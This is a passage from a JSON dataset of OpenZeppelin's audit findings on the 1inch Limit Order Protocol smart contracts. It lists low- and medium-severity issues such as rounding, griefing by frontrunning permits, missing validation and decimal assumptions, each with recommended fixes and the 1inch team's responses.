      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10695",
      "title": "[L12] Rounding can be unfavorable for taker",
      "impact": "LOW",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) and [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contracts, when an order is being filled and the taker provides only a `makingAmount` or `takingAmount` amount, the protocol attempts to calculate the counterpart amount of the swap.\n\n\nThere are two issues with these calculations, the first being that there is no documentation or logic limiting the number of decimals that the amount parameters should use, which we addressed in the ***Undocumented decimal assumptions*** issue.  \n\nThe second issue is that, in the course of these calculations, the protocol rounds in the favor of the maker. The rounding issue can be greatly exacerbated when the implicit decimal assumptions are broken, but even when everything is in the expected terms, rounding will occur with small, odd amounts.\n\n\nConsider allowing the taker to specify a minimum amount of `makerAsset` asset that they are willing to receive together with a maximum amount of `takerAsset` asset they are willing to swap, so that the acceptance of any rounding is more explicit.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> Threshold amount should be enough for taker’s protection.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10694",
      "title": "[L11] DoS orders possible when using hooks",
      "impact": "LOW",
      "content": "The [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract implements functionality to fill generic off-chain swap orders which could have conditions for their success. During order fills, the order can [check the predefined “predicate” conditions](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L218) before continuing with execution.\n\n\nHowever, because these predicate conditions could target the logic of any arbitrary contract, a malicious maker could trick takers into believing that an order behaves correctly and that it is valid when checking it off-chain, but then failing when attempting to fill the same order on-chain. This change in the predicate behavior could either be made by frontrunning some variable state on which the predicates depend, by examining the gas sent or even which addresses are involved in the call, or by some other logic.\n\n\nFurthermore, if the maker defined a [interaction during the swap](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L264), the `interactionTarget` contract could revert itself or revoke the allowance to prevent a successful order fill, essentially leading to the same result as malicious predicates.\n\n\nAlthough assets will not be at risk, users or bots finding a favorable order will have the increased burden of trying to identify these sorts of spam orders that can seem legitimate on the surface. In the case that they fail to identify these sorts of orders they will incur wasted gas costs. To reduce the amount of spam orders, consider restricting the available targets for these hooks. Also consider warning users about this possibility before they attempt to fill orders.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> We handle that on our backend and we’ll think about the ways to notify possible takers about the issue.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10693",
      "title": "[L10] Misleading or incomplete inline documentation",
      "impact": "LOW",
      "content": "Throughout the codebase, a few instances of misleading and/or incomplete inline documentation were identified and should be fixed.\n\n\nThe following are instances of misleading inline documentation:\n\n\n* In the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract, the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) function’s [NatSpec `@notice` tag](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L14) says that it `Calculates price of token relative to ETH scaled by 1e18`, but in fact, its result is the *value* of `amount` tokens scaled by `1e18`, where the oracle may not report in terms of ETH (for a pair not including ETH, for instance).\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, the `invalidatorForOrderRFQ` function’s [NatSpec `@return` tag](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L38) is misleading, because the quote may not have been filled for the respective invalidator bit to have been set. The order can also have been canceled.\n* On lines [147](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L147), [165](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L165), and [188](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L188) of [`OrderMixin.sol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol), the NatSpec `@param` tags are ungrammatical.\n* On line [20](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol#L20) of [`ERC1155Proxy.sol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC1155Proxy.sol), the `@notice` tag states that the computed hash is the result of hashing the `func_733NCGU` function, where it should be the `func_301JL5R` function instead.\n\n\nThe following are instances of incomplete inline documentation:\n\n\n* Functions in the [`AmountCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol) contract do not describe any of the parameters.\n* In the `ChainlinkCalculator` contract, the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) and [`doublePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L35) functions do not describe all of the parameters.\n* In the [`ImmutableOwner`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ImmutableOwner.sol) contract, the public variable and modifier have no NatSpec.\n* In the [`InteractiveNotificationReceiver`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/interfaces/InteractiveNotificationReceiver.sol) contract, the [`notifyFillOrder`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/interfaces/InteractiveNotificationReceiver.sol#L10) function does not describe any of the parameters.\n* In the [`LimitOrderProtocol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/LimitOrderProtocol.sol) contract, the `DOMAIN_SEPARATOR` function has no NatSpec.\n* Events and mappings in the [`NonceManager`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol) have no NatSpec.\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin) contract, `cancelOrderRFQ*` functions do not describe the return values.\n* In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, several functions lack complete NatSpec.\n* On line [168](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L168) of `OrderMixin.sol` and on line [71](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L71) of `OrderRFQMixin.sol`, it is missing the `@dev` tag.\n* Functions in the [`PredicateHelper`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol) contract do not describe all of the parameters.\n\n\nClear inline documentation is fundamental for outlining the intentions of the code. Mismatches between the inline documentation and the implementation can lead to serious misconceptions about how the system is expected to behave. Consider fixing these errors to avoid confusion for developers, users, and auditors alike.\n\n\n***Update:** Partially fixed. Misleading documentation addressed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75) and [pull request #77](https://github.com/1inch/limit-order-protocol/pull/77).*\n\n\n*The 1inch team states:*\n\n\n\n> We’ve fixed misleading docs. Completion of the docs will be done later.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10692",
      "title": "[L09] Low unit test coverage",
      "impact": "LOW",
      "content": "The unit test coverage for the entire project is around 75%, with some of the contracts having particularly low coverage.\n\n\nConsidering the importance of unit tests to validate code and prevent regressions when refactoring and developing new features, we encourage significantly increasing unit test coverage to at least 95%, and including edge cases that cover even unlikely situations.\n\n\n***Update:** Not fixed.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10691",
      "title": "[L08] Lack of input validation",
      "impact": "LOW",
      "content": "The [`fillOrderToWithPermit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L169) and [`fillOrderTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L190) functions of the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, as well as the [`fillOrderRFQToWithPermit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L72) and [`fillOrderRFQTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L90) functions of the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, do not validate the `target` address parameter.\n\n\nThis makes it possible for a user to inadvertently pass in the zero address and, as a result, lock up the assets they are meant to receive after filling an order.\n\n\nTo ensure that users do not accidentally lock up their funds, consider validating that the `target` address does not equal the zero address in the cited functions.\n\n\n***Update:** Fixed in [pull request #78](https://github.com/1inch/limit-order-protocol/pull/78).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10690",
      "title": "[L07] Inconsistent decoding methodologies could cause outcome discrepancies",
      "impact": "LOW",
      "content": "To support all of its extensibility and flexibility, the Limit Order Protocol routinely has to deal with dynamic bytes data and arbitrary return values from external contracts. As a result, the protocol includes an [`ArgumentsDecoder`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol) library to more efficiently convert dynamic bytes values into basic data types. However, this library is not used exclusively, and in some cases `abi.decode` is used instead. Additionally, some contracts are using [`abi coder v1`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol) while others are using [`abi coder v2`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol). The former performs more similarly to the `ArgumentsDecoder` library, whereas the latter performs additional checks when decoding.\n\n\nThe inconsistent usage of these different decoding methodologies can result in subtle discrepancies between the intention and actual behavior of the codebase.\n\n\nFor instance, the [`simulateCalls`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L116) function only uses the [`ArgumentsDecoder.decodeBool`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/ArgumentsDecoder.sol#L16) function. If the `simulateCalls` function is used to check calls that would be made in the predicate part of an order, then its results could deviate from what actually occurs when the predicate conditions are evaluated, because different decoding methodologies are employed.\n\n\nSo, for instance, if a predicate makes an external `staticcall` to some function that returns a `uint256` value greater than one rather than the expected `bool`, then that call will revert, because the return value is [decoded with `abi coder v2`‘s `abi.decode`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/PredicateHelper.sol#L19) which will not accept such values as `bool`. However, if the exact same call is made with `simulateCalls`, then it [will simply be marked as `true`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L123), because `decodeBool` treats any value larger than zero as `true`.\n\n\nTo make the `simulateCalls` function fully mirror the behavior of actual predicate calls, consider modifying it to use `abi.decode`.\n\n\n***Update:** Fixed in [pull request #82](https://github.com/1inch/limit-order-protocol/pull/82).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10689",
      "title": "[L06] Storage changes during event emission",
      "impact": "LOW",
      "content": "In the [`NonceManager`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol) contract, when the [`NonceIncreased`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol#L8) event is emitted, [the nonce of the message sender is also increased](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/NonceManager.sol#L19).\n\n\nExecuting multiple operations simultaneously can make the codebase harder to reason about, more prone to errors, and can lead to operations being overlooked or misunderstood.\n\n\nTo improve the overall intentionality, readability, and clarity of the code, consider increasing the nonce value before emitting the event.\n\n\n***Update:** Fixed in [pull request #63](https://github.com/1inch/limit-order-protocol/pull/63).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10688",
      "title": "[L05] Errors and omissions in events",
      "impact": "LOW",
      "content": "Throughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, many events lack indexed parameters and/or are missing important parameters. For example:\n\n\n* The [`OrderRFQMixin.OrderFilledRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L16), [`OrderMixin.OrderFilled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L31), and [`OrderMixin.OrderCanceled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L38) events should index the `orderHash` parameter.\n* The [`OrderRFQMixin.OrderFilledRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L16) and [`OrderMixin.OrderFilled`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L31) events should be more complete, including the `maker`, `taker`, `target`, `amountMaking`, and `amountTaking` where possible.\n\n\nThere are also sensitive actions that are lacking events, such as:\n\n\n* In the [`OrderRFQMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol) contract, the [`cancelOrderRFQ`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L44) function does not emit an event when an order is canceled.\n\n\nConsider more completely indexing existing events and adding new parameters where they are lacking. Also, consider emitting all events in such a complete manner that they could be used to rebuild the state of the contract by off-chain services.\n\n\n***Update:** Not fixed. However, the 1inch team did add an `orderRemaining` parameter to the `OrderCanceled` event in [pull request #62](https://github.com/1inch/limit-order-protocol/pull/62).*\n\n\n*The 1inch team states:*\n\n\n\n> We found that only a limited subset of data is required to satisfy frontend needs. In the case of extensive analysis, all the suggested fields are available via tracing. For `OrderRFQMixin` we expect market makers to build their own sophisticated way of tracking what orders have been canceled.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10687",
      "title": "[L04] Erroneous or misleading test suite",
      "impact": "LOW",
      "content": "There are instances in the test suite where the tests deviate from their expected behavior. For instance:\n\n\n* The [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract is inherited by the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L22) contract. However, during the tests the [`AmountCalculator.arbitraryStaticCall`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/test/ChainLinkExample.js#L26) function is used to call the `ChainlinkCalculator` contract as an external, independent contract. Even though the result is the one expected, the test should reflect the behavior with the current design of the system and anticipated use case by calling `ChainlinkCalculator` functions directly without using the arbitrary static call.\n* Though the proxy contracts were out of scope, we noticed that when testing the protocol with ERC721 assets, the [`ERC721Proxy`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ERC721Proxy.sol) contract is not used to swap the assets in its [test suite](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/test/LimitOrderProtocol.js#L310).\n\n\nAs the test suite itself is outside the scope of this audit, please consider thoroughly reviewing the test suite to make sure all tests run successfully according to the specifications of the protocol.\n\n\n***Update:** Fixed in [pull request #57](https://github.com/1inch/limit-order-protocol/pull/57), [pull request #59](https://github.com/1inch/limit-order-protocol/pull/59), and [pull request #61](https://github.com/1inch/limit-order-protocol/pull/61).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10686",
      "title": "[L03] Duplicated code",
      "impact": "LOW",
      "content": "There are instances of duplicated code within the codebase. Duplicating code can lead to issues later in the development lifecycle and leaves the project more prone to the introduction of errors. Such errors can inadvertently be introduced when functionality changes are not replicated across all instances of code that should be identical. Examples of duplicated code include:\n\n\n* In the [`Permitable`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol) contract, the [`_permit`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol#L12) and [`_permitMemory`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/libraries/Permitable.sol#L31) functions are duplicates.\n* The calculations in the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L14) and [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/AmountCalculator.sol#L20) functions are duplicated in the [`fillOrderRFQTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L90) function when calculating [making](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L128) and [taking](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderRFQMixin.sol#L124) amounts, respectively.\n\n\nRather than duplicating code, consider having just one contract or library containing the duplicated code and using it whenever the duplicated functionality is required.\n\n\n***Update:** Partially fixed in [pull request #60](https://github.com/1inch/limit-order-protocol/pull/60).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10685",
      "title": "[L02] Malicious parties could prevent the execution of permitable orders",
      "impact": "LOW",
      "content": "The [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract allows maker users to submit [permitable orders](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L207) so those can be executed in one transaction, rather than having to have a separate transaction for approvals. Also, order takers can [submit their own permit](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L176) during the filling of the order for the same purpose.\n\n\nHowever, because the maker’s permit is contained inside the [order](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L70), both the maker’s and the taker’s permits would be accessible while the order-fill transaction is in the mempool. This would make it possible for any malicious user to take those permits and execute them on the respective asset contracts while frontrunning the fill transaction. Because these permits have a `nonce` to prevent a double spending attack, the order’s fill transaction would fail as a result of trying to use the same permit that was just used during the frontrun.\n\n\nAlthough there is no security risk, and the maker could create a new order and pre-approve the transaction, this attack could certainly impact the usability of permitable orders. Indeed, a motivated attacker could block *all* permitable orders with this attack. Consider validating if the permit was already submitted, or if the allowance is enough, during the order fills. Also consider letting users know about this possible attack during order composition.\n\n\n***Update:** Not fixed. The 1inch team states:*\n\n\n\n> We had approval checks before but decided to simplify permit flow to just revert on unsuccessful approvals. We’ll think about the ways to notify makers about the issue.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10684",
      "title": "[L01] Constants not declared explicitly",
      "impact": "LOW",
      "content": "There are a few occurrences of literal values being used with unexplained meaning in the codebase. For example:\n\n\n* In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`_remaining`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L80) mapping is semantically overloaded (as explained in the issue ***Semantic overloading of mapping***) to track the amount of asset remaining for a partially filled order *as well as* if an order has been completely filled. Specifically, `0` means that no fills associated with an order have been made, `1` means an order can no longer be filled, and anything larger than `1` means that there is a remaining amount associated with the order that can potentially be filled.\n* In the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract, the literal value `1e18` is used in the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L27-L29) function.\n\n\nTo improve the code’s readability and facilitate refactoring, consider defining a constant for every magic number, giving it a clear and self-explanatory name. For complex values, consider adding an inline comment explaining how they were calculated or why they were chosen.\n\n\n***Update:** Fixed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75) and [pull request #76](https://github.com/1inch/limit-order-protocol/pull/76).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10683",
      "title": "[M03] Undocumented decimal assumptions",
      "impact": "MEDIUM",
      "content": "The [`LimitOrderProtocol`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/LimitOrderProtocol.sol) contract inherits the [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract through the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract. This contract exposes two functions to enable the usage of Chainlink oracles during the [predicates check](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L218) and the lookup of the [maker amount](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315)/[taker amount](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326).\n\n\nHowever, the contract makes undocumented assumptions about the number of decimals that the Chainlink oracles should report in, as well as the number of decimals that the function parameters should contain. In certain scenarios, this could lead to unexpected behaviors, including the mis-pricing of assets and the unintentional loss of funds.\n\n\nMore specifically, throughout the contract the implicit assumption is that the Chainlink oracles will report with 18 decimals of precision. However, not [all Chainlink oracles](https://docs.chain.link/docs/ethereum-addresses/) report with this number of decimals. In fact, if the oracle reports a token pair that is in terms of a currency (USD, for instance), it will only have 8 decimals of precision. Since there are no restrictions on *which* oracles can be used, implicit assumptions should not be made about the number of decimals they will report with.\n\n\nRelatedly, there is an implicit assumption that the `amount` parameter for the `ChainlinkCalculator` functions will use 18 decimals, together with the misleading explicit declaration that the [`singlePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L21) function [`Calculates price of token relative to ETH scaled by 1e18`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L14). In reality, even with an oracle that *does* report with 18 decimals, the return value of the `singlePrice` function would be scaled by the number of decimals of the `amount` parameter, which may not necessarily be 18 decimals.\n\n\nSimilarly, the [`doublePrice`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L35) function assumes that two Chainlink oracles will report with the same number of decimals, causing the result of the function to deviate from expectations.\n\n\nConsider explicitly documenting assumptions regarding the number of decimals that parameters and return values should be in terms of. Furthermore, consider either limiting calculations that depend on oracles that break those assumptions, or having the relevant calculations take the actual number of decimals into account.\n\n\n***Update:** Fixed in [pull request #75](https://github.com/1inch/limit-order-protocol/pull/75).*",
